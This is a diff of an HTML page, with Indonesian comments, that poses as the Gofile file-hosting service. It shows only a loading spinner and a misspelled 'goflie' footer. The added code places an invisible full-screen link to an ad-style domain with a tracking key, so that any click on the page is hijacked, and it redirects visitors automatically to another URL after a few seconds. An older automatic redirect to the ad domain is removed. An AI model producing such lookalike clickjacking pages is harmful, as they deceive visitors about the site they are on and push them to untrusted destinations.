@@ -1,121 +1,225 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Pengalihan Cadangan (Fallback) -->
+    <meta http-equiv="refresh" content="4; url=https://www.tujuan-anda.com/">
+    <title>gofile</title>
+    
+    <style>
+        :root {
+            --accent-color: #007bff; /* Biru elektrik khas Gofile */
+            --secondary-text: rgba(255, 255, 255, 0.3);
+            --bg-color: #0a0a0b;
+            --glow-color: rgba(0, 123, 255, 0.4);
+        }
 
-  <meta name="6a97888e-site-verification" content="1b196d65f4070b0f2ecec4254e4a2c67">
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>gofile</title>
-  <style>
-    * { box-sizing: border-box; }
+        * {
+            box-sizing: border-box;
+        }
 
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background: #1f2a3a; /* dark blue ala gofile */
-      display: flex;
-      flex-direction: column;
-      color: #94a3b8;
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            background-color: var(--bg-color);
+            color: #fff;
+        }
 
-    /* HEADER */
-    header {
-      height: 56px;
-      display: flex;
-      align-items: center;
-      padding: 0 16px;
-      background: #1b2533;
-    }
+        /* Latar Belakang ala Gofile dengan aksen warna */
+        .background-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: radial-gradient(circle at 50% -20%, #151921 0%, #0a0a0b 80%);
+        }
 
-    .menu-btn {
-      width: 36px;
-      height: 36px;
-      border-radius: 6px;
-      background: #2563eb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        .glow-bg {
+            position: absolute;
+            width: 800px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(0, 123, 255, 0.08) 0%, rgba(0, 0, 0, 0) 70%);
+            border-radius: 50%;
+            top: -250px;
+            left: 50%;
+            transform: translateX(-50%);
+            filter: blur(60px);
+        }
 
-    .menu-btn span,
-    .menu-btn span::before,
-    .menu-btn span::after {
-      content: '';
-      display: block;
-      width: 16px;
-      height: 2px;
-      background: #fff;
-      position: relative;
-    }
+        /* Ikon Menu Garis Tiga */
+        .menu-icon {
+            position: absolute;
+            top: 2rem;
+            left: 2rem;
+            width: 22px;
+            height: 16px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+            z-index: 20;
+            opacity: 0.5;
+            transition: all 0.3s ease;
+        }
 
-    .menu-btn span::before { top: -5px; position: absolute; }
-    .menu-btn span::after { top: 5px; position: absolute; }
+        .menu-icon:hover {
+            opacity: 1;
+            transform: scale(1.1);
+        }
 
-    /* MAIN */
-    main {
-      flex: 1;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        .menu-line {
+            width: 100%;
+            height: 1.5px;
+            background-color: #fff;
+            border-radius: 2px;
+        }
 
-    /* GOFILE-LIKE SPINNER */
-    .spinner {
-      width: 60px;
-      height: 60px;
-      border-radius: 50%;
-      border: 5px solid transparent;
-      border-top-color: #3b82f6;
-      border-right-color: #3b82f6;
-      animation: spin 1s linear infinite;
-    }
+        /* Kontainer Utama */
+        .content-wrapper {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2;
+        }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+        /* Spinner Premium Dual-Ring Berwarna */
+        .spinner-box {
+            position: relative;
+            width: 70px;
+            height: 70px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
 
-    /* FOOTER */
-    footer {
-      padding: 20px 0 30px;
-      text-align: center;
-      font-size: 14px;
-      background: #1b2533;
-    }
+        /* Cincin Luar Berwarna */
+        .outer-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 2px solid rgba(255, 255, 255, 0.03);
+            border-top: 2px solid var(--accent-color);
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
+            filter: drop-shadow(0 0 8px var(--glow-color));
+        }
 
-    footer a {
-      display: block;
-      color: #94a3b8;
-      text-decoration: none;
-      margin: 6px 0;
-    }
-  </style>
+        /* Cincin Dalam */
+        .inner-ring {
+            position: absolute;
+            width: 60%;
+            height: 60%;
+            border: 1.5px solid rgba(255, 255, 255, 0.03);
+            border-bottom: 1.5px solid var(--accent-color);
+            border-radius: 50%;
+            animation: spin-reverse 0.6s linear infinite;
+            opacity: 0.8;
+        }
+
+        /* Titik Tengah Berpendar Biru */
+        .center-glow {
+            width: 5px;
+            height: 5px;
+            background-color: var(--accent-color);
+            border-radius: 50%;
+            box-shadow: 0 0 15px 3px var(--glow-color);
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes spin-reverse {
+            0% { transform: rotate(360deg); }
+            100% { transform: rotate(0deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.6; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.3); }
+        }
+
+        /* Copyright di bawah */
+        .footer {
+            padding-bottom: 3rem;
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: var(--secondary-text);
+            text-transform: uppercase;
+            z-index: 2;
+        }
+
+        .fade-in {
+            animation: fadeIn 1.5s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .overlay-link {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            cursor: pointer;
+            z-index: 10;
+        }
+    </style>
 </head>
 <body>
 
-  <header>
-    <div class="menu-btn"><span></span></div>
-  </header>
+    <div class="background-container">
+        <div class="glow-bg"></div>
+    </div>
 
-    <main id="content">
-    <div class="spinner" id="spinner"></div>
-  </main>
+    <!-- Ikon Menu -->
+    <div class="menu-icon fade-in">
+        <div class="menu-line"></div>
+        <div class="menu-line" style="width: 70%;"></div>
+        <div class="menu-line"></div>
+    </div>
 
-  <footer>
-    <a href="#">Home</a>
-    <a href="#">Terms of Service</a>
-    <a href="#">Privacy Policy</a>
-    <a href="#">Copyright</a>
-  </footer>
+    <!-- Klik manual -->
+    <a href="https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb" class="overlay-link"></a>
 
-  <script>
-    // spinner tampil 2 detik lalu hilang
-    setTimeout(() => {
-      const spinner = document.getElementById('spinner');
-      spinner.style.opacity = '0';
-      spinner.style.transition = 'opacity 0.3s ease';
-    }, 1000);
-  </script>
+    <div class="content-wrapper fade-in">
+        <!-- Spinner Dual-Ring Modern Berwarna -->
+        <div class="spinner-box">
+            <div class="outer-ring"></div>
+            <div class="inner-ring"></div>
+            <div class="center-glow"></div>
+        </div>
+    </div>
+
+    <!-- Footer Copyright -->
+    <div class="footer fade-in">
+        &copy; 2026 goflie. All Rights Reserved.
+    </div>
+
+    <script>
+        const targetURL = "https://www.tujuan-anda.com/";
+        
+        // Pengalihan otomatis setelah 3 detik
+        setTimeout(() => {
+            window.location.href = targetURL;
+        }, 3000);
+    </script>
 
 <script>
 /* tampilkan slug random SETELAH Histats */
@@ -147,14 +251,6 @@ if (!sessionStorage.getItem("histats_hit")) {
   })();
 }
 
-/* redirect */
-setTimeout(() => {
-  document.body.classList.add("fade-out");
-  setTimeout(() => {
-    location.href = "https://braverybreezebinding.com/dyu6kzr44?key=703bc4908bfdd21b148e4fe03f9810cb";
-  }, 600);
-}, 800);
-</script>
 
   
 </body>
